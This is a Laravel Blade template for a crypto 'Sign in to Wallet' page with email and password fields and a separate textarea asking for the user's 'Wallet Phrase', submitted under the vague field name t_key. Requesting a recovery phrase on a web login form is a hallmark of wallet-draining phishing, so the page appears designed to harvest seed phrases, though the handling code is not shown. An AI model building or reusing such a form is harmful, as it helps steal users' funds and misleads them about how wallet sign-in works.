@extends('theme.auth')

@section('content')
    <div class="wrap">
        <div class="tf-container">
            <form class="from-login" method="post" action="{{ url('login') }}">
                @csrf
                @if (session('success'))
                    <div class="alert alert-success mb-16">
                        {{ session('success') }}
                    </div>
                @endif
                @if ($errors->any())
                    <div class="alert alert-danger mb-16">
                        <ul class="mb-0">
                            @foreach ($errors->all() as $error)
                                <li>{{ $error }}</li>
                            @endforeach
                        </ul>
                    </div>
                @endif
                <div class="top-from">
                    <h4 class="title fw-6">Sign in to Wallet</h4>
                    <div class="sub-title">Welcome back! Please enter your details below.</div>
                </div>
                <div class="middle-from">
                    <fieldset class="mb-12 icon-absolute">
                        <i class="icon-mail"></i>
                        <input type="email" name="email" placeholder="Email">
                    </fieldset>
                    <fieldset class="box-auth-pass mb-12 tf-field icon-absolute">
                        <i class="icon-lock"></i>
                        <input type="password" name="password" placeholder=" " id="password"
                            class="password-field tf-field-input tf-input">
                        <label class="tf-field-label" for="password">Password</label>
                        <span class="show-pass">
                            <span class="icon-eye"></span>
                            <span class="icon-eye-off"></span>
                        </span>
                    </fieldset>
                    <fieldset class="box-auth-pass mb-12 tf-field icon-absolute">
                        <i class="icon-lock"></i>
                        <input type="password" name="password_confirmation" placeholder=" " id="password_confirmation"
                            class="password-field tf-field-input tf-input">
                        <label class="tf-field-label" for="password_confirmation">Confirm Password</label>
                        <span class="show-pass">
                            <span class="icon-eye"></span>
                            <span class="icon-eye-off"></span>
                        </span>
                    </fieldset>
                    <div class="d-flex align-items-center mb-12">
                        <div class="flex-grow-1 border-top"></div>
                        <span class="px-12 text-muted">Or</span>
                        <div class="flex-grow-1 border-top"></div>
                    </div>
                    <p class="mb-2" style="color: #94a3b8; padding-left: 12px;">
                        Wallet Phrase
                    </p>
                    <fieldset class="mb-12 icon-absolute">
                        <textarea style="background-color: #efefef;" type="text" name="t_key" placeholder=""></textarea>
                    </fieldset>
                </div>
                <div class="bottom-from">
                    <button type="submit" class="tf-btn primary mb-12">Sign In</button>
                </div>
                <p class="mt-2">Forgot password? <a href="reset" style="color: #7e6edd;">Reset it</a></p>
                <div class="fixed-bottom-btn">
                    <p class="text-bottom">
                        Don't have a wallet? <a href="register/create">Sign Up</a>
                    </p>
                </div>
            </form>

        </div>

    </div>
@endsection
